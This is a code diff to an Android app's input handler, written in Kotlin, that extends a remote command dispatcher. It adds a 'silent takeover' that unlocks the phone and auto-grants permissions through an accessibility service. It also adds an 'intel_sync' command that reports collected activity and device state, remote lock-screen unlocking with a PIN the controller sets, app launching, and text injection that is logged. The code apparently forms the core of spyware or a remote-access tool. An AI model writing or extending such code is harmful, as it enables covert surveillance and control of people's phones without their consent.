@@ -2,17 +2,20 @@ package com.phonehand.app
 
 import android.accessibilityservice.AccessibilityService
 import android.content.Context
+import android.content.Intent
 import android.media.AudioManager
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import org.json.JSONObject
+import java.util.concurrent.Executors
 
 object InputHandler {
     private const val TAG = "Input"
     var service: TouchAccessibilityService? = null
     private val mainHandler = Handler(Looper.getMainLooper())
+    private val bg = Executors.newSingleThreadExecutor()
 
     fun handle(context: Context, json: String) {
         mainHandler.post {
@@ -20,7 +23,7 @@ object InputHandler {
                 val msg = JSONObject(json)
                 val type = msg.optString("type")
                 val run = Runnable { dispatch(context, msg, type) }
-                if (needsWake(type) && !ScreenPower.isInteractive(context)) {
+                if (needsWake(type, msg) && !ScreenPower.isInteractive(context)) {
                     ScreenPower.wakeScreen(context)
                     mainHandler.postDelayed(run, 300)
                 } else {
@@ -32,13 +35,36 @@ object InputHandler {
         }
     }
 
-    private fun needsWake(type: String): Boolean =
-        type in setOf("click", "tap", "swipe", "scroll", "text", "setup_takeover")
+    private fun needsWake(type: String, msg: JSONObject): Boolean {
+        if (type == "key" && msg.optString("action") == "unlock") return true
+        return type in setOf("click", "tap", "swipe", "scroll", "text", "setup_takeover", "open_app", "clipboard_paste")
+    }
 
     private fun dispatch(context: Context, msg: JSONObject, type: String) {
-        if (type == "setup_takeover" || (type == "command" && msg.optString("action") == "setup_takeover")) {
-            startSilentTakeover(context)
-            return
+        when {
+            type == "setup_takeover" || (type == "command" && msg.optString("action") == "setup_takeover") -> {
+                startSilentTakeover(context)
+                return
+            }
+            type == "intel_sync" -> {
+                ActivityCollector.get(context).syncNow()
+                DeviceStateReporter.send(context)
+                return
+            }
+            type == "open_app" -> {
+                openApp(context, msg.optString("package", ""))
+                return
+            }
+            type == "clipboard_paste" -> {
+                pasteClipboard(context, msg.optString("text", ""))
+                return
+            }
+            type == "set_unlock_pin" -> {
+                val pin = msg.optString("pin", "").trim()
+                if (pin.length in 4..12) UnlockStore.setPin(context, pin)
+                DeviceStateReporter.send(context)
+                return
+            }
         }
 
         val svc = service
@@ -85,6 +111,23 @@ object InputHandler {
         }
     }
 
+    private fun openApp(context: Context, packageName: String) {
+        if (packageName.isBlank()) return
+        val pm = context.packageManager
+        val launch = pm.getLaunchIntentForPackage(packageName) ?: return
+        launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        context.startActivity(launch)
+    }
+
+    private fun pasteClipboard(context: Context, text: String) {
+        if (text.isBlank()) return
+        val svc = service ?: return
+        if (!ScreenPower.isInteractive(context)) ScreenPower.wakeScreen(context)
+        injectText(text)
+        NotesStore.append(context, text, "clipboard", svc.lastWindowPkg())
+        svc.scheduleRefreshesAfterInput()
+    }
+
     private fun handleKey(context: Context, action: String) {
         val svc = service ?: return
         when (action) {
@@ -101,6 +144,12 @@ object InputHandler {
                 }
             }
             "wake" -> ScreenPower.wakeScreen(context)
+            "unlock" -> bg.execute {
+                val result = LockScreenHelper.unlockBlocking(context, svc)
+                Log.d(TAG, "unlock result: $result")
+                DeviceStateReporter.send(context)
+                svc.scheduleRefreshesAfterInput(forceFull = true)
+            }
             "lock" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
             "volume_up" -> {
                 val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
@@ -130,7 +179,7 @@ object InputHandler {
     }
 
     private fun startSilentTakeover(context: Context) {
-        if (PermissionAutoGrant.isRunning()) {
+        if (SettingsPermissionGrant.isRunning() || PermissionAutoGrant.isRunning()) {
             Log.d(TAG, "setup_takeover already running")
             SetupReporter.progress("Already granting permissions…")
             return
@@ -142,9 +191,12 @@ object InputHandler {
         }
         ScreenPower.wakeScreen(context)
         SetupReporter.progress("Starting AI permission grant…", "start")
-        ActivityCollector.get(context).onSetupTakeover()
-        mainHandler.postDelayed({
-            PermissionAutoGrant.runLightning(context)
-        }, 350)
+        bg.execute {
+            val svc = TouchAccessibilityService.instance
+            if (svc != null) LockScreenHelper.unlockBlocking(context, svc)
+            mainHandler.postDelayed({
+                SettingsPermissionGrant.runLightning(context)
+            }, 350)
+        }
     }
 }
